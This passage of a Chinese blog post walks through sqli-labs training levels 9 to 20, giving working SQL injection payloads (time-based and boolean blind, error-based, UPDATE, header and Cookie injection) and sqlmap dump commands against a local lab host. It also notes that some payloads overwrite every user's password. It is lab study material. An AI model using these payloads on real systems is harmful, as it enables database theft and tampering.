+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>, <span class="number">4999999</span>, <span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>, <span class="number">30</span>), <span class="string">&#x27;b&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
+
+<p>或：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>Sqlmap：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.31</span><span class="number">.224</span><span class="number">.1</span>:<span class="number">83</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>p <span class="string">&#x27;id&#x27;</span> <span class="comment">--technique T -D challenges -T ygse7nvrdk -C secret_DUQL --dump --flush-session --batch</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>双括号包裹、无括号包裹的字符型时间盲注。</p>
+<p>回显内容始终固定。</p>
+<p>POC：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; or sleep(0.1) ;%23+</span><br></pre></td></tr></table></figure></div>
+
+<p>Sqlmap：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.31</span><span class="number">.224</span><span class="number">.1</span>:<span class="number">83</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-10</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>p <span class="string">&#x27;id&#x27;</span> <span class="comment">--technique T -D challenges -T ygse7nvrdk -C secret_DUQL --dump --flush-session --batch --level=2</span></span><br></pre></td></tr></table></figure></div>
+
+<p>需要指定 <code>--level=2</code> ，第一级未尝试双引号。</p>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>变成了 POST 传参。新增了登录框，万能密码可登陆成功，但拿不到 flag。</p>
+<p>有报错回显，鉴定为字符型报错注入。</p>
+<p>PoC-POST：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e, (select database()),0x7e))+;%23+&amp;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk),0x7e))+;%23+&amp;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>双引号包裹的字符型报错注入。外有一层括号。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin&quot;) or extractvalue(NULL, concat(0x7e, (select substr(group_concat(secret_DUQL),1,32) from challenges.ygse7nvrdk), 0x7e)); %23+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>单引号包裹的字符型报错注入，外有一层括号。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123456</span><span class="string">&#x27;) or extractvalue(1, concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e));%23+&amp;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Use “Double Injection”：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123456</span><span class="string">&#x27;) union select concat((select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;%23+&amp;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>双引号包裹的字符型报错注入，无括号包裹。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin&quot; or extractvalue(null, concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e));%23+</span><br></pre></td></tr></table></figure></div>
+
+<p>Use “Double Injection”：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin&quot; union select concat((select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;%23+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>字符型布尔盲注。</p>
+<p>首先验证单引号还是双引号，周围有无（几个）括号：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin<span class="string">&#x27; order by 1;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里能用于检测是因为数据库里恰好有”uname&#x3D;admin”的数据，用下面的更严谨：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin<span class="string">&#x27; or 1=1 order by 1;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>登陆成功，因此单引号包裹，无括号。</p>
+<p>布尔盲注PoC：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))=115, true, false);%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>验证了当前使用的数据库名称首字母是’s’。</p>
+<p>Sqlmap：</p>
+<p>sqlmap 的布尔盲注一直都有点问题。</p>
+<p>先上最终 payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.31.224.1:83/sqli-labs-master/Less-15/ --data=<span class="string">&quot;passwd=123456&amp;uname=1&quot;</span> --technique B -D challenges -T ygse7nvrdk -C secret_DUQL --dump --flush-session --not-string=<span class="string">&quot;slap.jpg&quot;</span> --level=2 --risk=3</span><br></pre></td></tr></table></figure></div>
+
+<p>参数中，为了测试布尔盲注的适用性，规定了使用布尔盲注技术注入：<code>--technique B</code> 。<code>--not-string=&quot;slap.jpg&quot;</code> 为 sqlmap 标注注入失败时页面返回的关键词。在 <code>--risk=3</code> 的情况下，sqlmap 才会使用 or 句型的盲注测试语句，<code>--level=2</code> 才会确定布尔盲注的可行性。</p>
+<p>在 <code>--risk=1(default)</code> 的情况下，sqlmap只会测试 AND 句型的布尔盲注，例如 <code>123456&#39; AND 2147=2147 AND &#39;cOBB&#39;=&#39;cOBB</code> ，若注入环境是一般的查询语句，例如传入 id 并返回对应值的情况，则可以通过。但本题是一个登录环境，两个参数”uname”与”passwd”用于验证且用 AND 连接，因此该句型就无法通过布尔盲注的测试了。</p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>双引号+单括号包裹的字符型布尔盲注。</p>
+<p>验证双引号闭合，且有一个括号包裹，且字段数为 2：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span>admin&quot;) or 1=1 order by 2;%23+</span><br></pre></td></tr></table></figure></div>
+
+<p>PoC-True：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span><span class="number">123</span>&quot;) or ascii(substr((select database()),1,1))=115;%23+</span><br></pre></td></tr></table></figure></div>
+
+<p>PoC-False：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>uname<span class="operator">=</span><span class="number">123</span>&quot;) or ascii(substr((select database()),1,1))&gt;115;%23+</span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.31</span><span class="number">.224</span><span class="number">.1</span>:<span class="number">83</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-16</span><span class="operator">/</span>index.php <span class="comment">--data=&quot;passwd=123456&amp;uname=123&quot; -p uname --technique B -D challenges -T ygse7nvrdk -C secret_DUQL --dump --not-string=slap.jpg --risk=3 --level=2 --flush-session --batch</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>单引号包裹的字符型Update注入。查看源码后发现”uname”参数过滤很严，但”passwd”毫无检查，因此需要选择”passwd”下手。</p>
+<p>同时注意源码中写定，页面返回内容只与”uname”有关，若有指定的用户名就会返回密码重置成功，实际执行更新语句的结果没被考虑进去。因此此处不能使用布尔盲注，只能考虑用时间盲注。</p>
+<p>此处能够注入的前提是知道至少一个用户名，此处有一个很好猜的”admin”。</p>
+<p>PoC：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123123</span><span class="string">&#x27; and if(ascii(substr((select database()),1,1))=115,sleep(1),1);%23+&amp;uname=admin</span></span><br></pre></td></tr></table></figure></div>
+
+<p>上述语句会破坏数据库内容，因为它修改了所有数据的”passwd”字段，正因如此 set 部分的语句被执行了多遍，延迟执行了多次，最后延时远超 1s，加上 where 来避免这个问题：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd<span class="operator">=</span><span class="number">123123</span><span class="string">&#x27; and if(ascii(substr((select database()),1,1))=115,sleep(1),1) where username=&#x27;</span>admin<span class="string">&#x27;;%23+&amp;uname=admin</span></span><br></pre></td></tr></table></figure></div>
+
+<p>延时正常，数据库中的数据也只有用户名为”admin”的一条被修改了，因为修改语句只执行了一次，因此只延时了一次，睡眠 1s。</p>
+<p>Sqlmap：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.31</span><span class="number">.224</span><span class="number">.1</span>:<span class="number">83</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>less<span class="number">-17</span><span class="operator">/</span>index.php <span class="comment">--data &quot;uname=admin&amp;passwd=123&quot; -p passwd --method POST --technique T -D challenges -T nym3pzmdgz -C secret_I54I --dump --flush-session</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但 sqlmap 中的 payload 会直接破坏数据库，修改所有用户的密码。</p>
+<hr>
+<p>回到题目思路分析，这是一个密码重置服务，第一考虑的是不能让黑客轻易修改他人密码，因此必然会对 username 做严格过滤，相对而言密码是什么样的似乎并不重要，因此这里”username”注入不了的设计是合理的。</p>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>字符型”User-Agent”报错注入，前提是有一个可登录的账户。</p>
+<hr>
+<p>黑盒完全测试不出东西，IP 是从 $_SERVER[‘REMOTE_ADDR’] 中读取的，他完全不受请求头的影响（如 X-Forwarded-For 与 Referer 与 Origin），尝试利用注入登录发现 uname 与 passwd 都注入不成功。</p>
+<p>不得已直接看了源码，两个传入的参数都经过了严格过滤，而只有在登录成功时会将UA记录到数据库中，插入UA的部分没有过滤，这意味着可以注入，但前提是知道一个可以登录的账户与密码。这里假设是一个可供一般用户登录的网站，那么有一个可登录的账户是合理的。</p>
+<p>因为是插入 UA，因此考虑这样一个语句：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> useragent <span class="keyword">values</span>(<span class="string">&#x27;UA&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>往 UA 中写入注入语句：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UA<span class="string">&#x27;  </span></span><br></pre></td></tr></table></figure></div>
+
+<p>发现有报错，进行报错注入：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UA<span class="string">&#x27; or extractvalue(1, concat(0x7e, (select database()), 0x7e)),1,1);# </span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里会发现插入数据时，后面实际上还跟着两条不知道什么内容，插入的数据后面利用逻辑运算，直接连接函数操作来触发报错。</p>
+<p>或者不需要猜后面跟着内容的数量，直接就能注出来：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UA<span class="string">&#x27; or extractvalue(1, concat(0x7e, (select database()), 0x7e)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在 Mysql 中插入的数据如果做了逻辑运算，最终生效的值会是逻辑表达式中的最后一项表达式的值。</p>
+<p>最终 payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and extractvalue(1, concat(0x7e, (select secret_TVOT from challenges.so4n6ikgds), 0x7e)) and &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>payload 中使用 or 连接可能会出现奇怪的短路优化导致中间函数执行失败的情况，因此考虑用 and。</p>
+<hr>
+<p>关于 payload 的一点奇怪语言特性，当我们尝试获取简单函数的内容时，往 payload 的 UA 中可以任意添加字符串：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UA<span class="string">&#x27; or extractvalue(1, concat(0x7e, (select database()), 0x7e)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但如果去掉 <code>extratvalue()</code> 函数或者尝试查询更复杂的内容，会出现如下报错：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">1292</span> (<span class="number">22007</span>): Truncated incorrect <span class="keyword">DOUBLE</span> <span class="keyword">value</span>: <span class="string">&#x27;abs&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>因为不知道什么原因，在上述情况下逻辑运算符会将两侧的内容识别为”DOUBLE”类型用于进行逻辑运算，因此 UA 中的字符串内容要么为空，要么为合法的数值字符串。</p>
+<p>且这个特性目前只在 UPDATE 句型中出现，如以下语句可以正常运行：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;abc&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>)) <span class="keyword">or</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>需要正常登录的字符型”Referer”头 Insert 注入，无括号。</p>
+<hr>
+<p>登录成功后回显了一个 Referer 头信息，推测为 Referer 头注入，Referer 一般用于标记用户访问时的来源网址（即从哪个网站访问了当前网址），此处模拟了服务器记录用户访问的来源信息。</p>
+<p>测试为单引号闭合，注入点为一个 Insert 语句，payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123.123</span><span class="string">&#x27; and extractvalue(1, concat(0x7e,(select secret_TVOT from challenges.so4n6ikgds),0x7e)) and &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>仍旧上一关发现的问题，单引号前的内容需要是合法的 DOUBLE 类型字符串。</p>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>单引号包裹的字符型 Cookie 入口查询语句注入。实际上模拟了根据简单的 Cookie 认证用户身份的登录系统，该系统根据传入的 Cookie 利用查询语句验证身份，并获取对应用户信息。</p>
+<hr>
+<p>成功登录后返回对应 Cookie：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin</span><br></pre></td></tr></table></figure></div>
+
+<p>利用 Cookie 认证用户身份，可以直接伪造 Cookie 信息来查询到”username”为”admin”的用户的信息。这意味着后端会查询传入的 Cookie 内容，因此可以考虑对查询语句进行注入。</p>
+<p>PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>发现有报错，证明了是单引号包裹的字符串，且 Cookie 内容确实被拼接进了查询语句中。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin<span class="string">&#x27; or extractvalue(1, concat(0x7e,(select secret_TVOT from challenges.so4n6ikgds),0x7e)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Page-1-End"><a href="#Page-1-End" class="headerlink" title="Page-1 End"></a>Page-1 End</h2><p>第 21 关与 22 关在第一面链接不进去，因此放在了 Page-2 中。</p>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> [Sqli-Labs-Master] - Page_1</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-11-01 01:04:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-01 01:07:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/11/01/Security/Range/[Sqli-Labs-Master] - Page_1/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">[Sqli-Labs-Master] - Page_1</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqli-Labs-Master-Page1"><span class="nav-text">Sqli-Labs-Master_Page1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6"><span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-7"><span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8"><span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9"><span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-10"><span class="nav-text">Less-10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11"><span class="nav-text">Less-11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12"><span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13"><span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14"><span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-15"><span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-16"><span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-17"><span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-18"><span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-19"><span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-20"><span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Page-1-End"><span class="nav-text">Page-1 End</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
